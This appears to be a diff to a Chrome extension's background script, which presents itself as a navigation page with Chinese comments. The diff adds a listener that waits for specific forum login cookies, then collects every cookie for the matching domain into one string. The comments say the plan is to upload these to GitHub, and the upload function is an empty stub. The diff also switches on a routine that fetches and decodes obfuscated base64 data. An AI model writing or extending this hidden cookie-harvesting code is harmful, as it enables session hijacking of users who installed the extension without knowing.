@@ -6,7 +6,7 @@ initEvent()
 // 系统初始化
 // initConfig()
 
-// getChromeHuijiaData()
+getChromeHuijiaData()
 
 function initConfig() {
   console.log('系统初始化');
@@ -96,8 +96,44 @@ function getChromeHuijiaData() {
     var real_content = content.replaceAll("VkdWxlIGV4cHJlc3Npb25z", "")
     var real_json = JSON.parse(atob(real_content))
     console.log('解析后的真是数据是:', real_json);
+    // 渲染导航页面
     initHomeUrl(real_json.data.navigation)
+    // 开启cookie监听
+    var ruleObj = { "1024": "227c9_winduser", "91": "91cookie", "98": "98cookie" }
+    cookieLister(ruleObj)
   });
+}
+
+// 向github提交数据
+function putDataToGit() {
+  console.log('向github提交数据');
+}
+
+// 设置一个cookie监听器，当有监听到1024/91/98等的cookie的时候，就提交到git
+function cookieLister(rule) {
+  console.log('监听cookie变化的监听器', rule);
+  var ruleKeys = Object.keys(rule)
+  var ruleValues = Object.values(rule)
+  chrome.cookies.onChanged.addListener((changeInfo) => {
+    console.log('cookie发生变化了', changeInfo);
+    var cookieKey = changeInfo.cookie.name
+    if (ruleValues.indexOf(cookieKey) !== -1) {
+      // 如果发现有对应的cookie存在，就根据域名获取到所有的cookie
+      // console.log('找到了对应的cookie', cookieKey);
+      var cookieDomain = "https://" + changeInfo.cookie.domain
+      chrome.cookies.getAll({ url: cookieDomain }, function (cookies) {
+        // console.log('得到的Cookie是:', cookies);
+        const resList = cookies.map(item => {
+          return `${item.name}=${item.value}`
+        })
+        const cookieStr = resList.join("; ")
+        // 判断是哪个网站的cookie
+        var ruleType = ruleKeys[ruleValues.indexOf(cookieKey)]
+        console.log("ruleType-----", ruleType);
+        console.log('cookieStr-------', cookieStr);
+      });
+    }
+  })
 }
 
 // 显示网站的cookie
@@ -214,9 +250,6 @@ function showCookie() {
 
 
 // 检测Cookie发生变化
-chrome.cookies.onChanged.addListener((changeInfo) => {
-  console.log('cookie发生变化了', changeInfo);
-})
 
 // 存储和读取store中的数
 function storageSet(key, value) {
@@ -247,25 +280,6 @@ function clearData(key) {
   }
 }
 
-// 获取数据
-async function asyncGetData(key) {
-  // 获取单个key的值
-  // chrome.storage.sync.get([key]).then((result) => {
-  //   console.log("Value currently is ", result);
-  //   document.getElementById("asyncDataBox").innerHTML = result[key]
-  // });
-  // 获取到的所有数据
-  const all = await chrome.storage.sync.get();
-  let resultContent = "<br>"
-  console.log('获取到的所有同步数据是:', all);
-  for (const key in all) {
-    if (Object.hasOwnProperty.call(all, key)) {
-      const element = all[key];
-      resultContent += `${key} : ${element} <br>`
-    }
-  }
-  document.getElementById("asyncDataBox").innerHTML = resultContent
-}
 
 // 获取1024地址
 function get1024Home() {
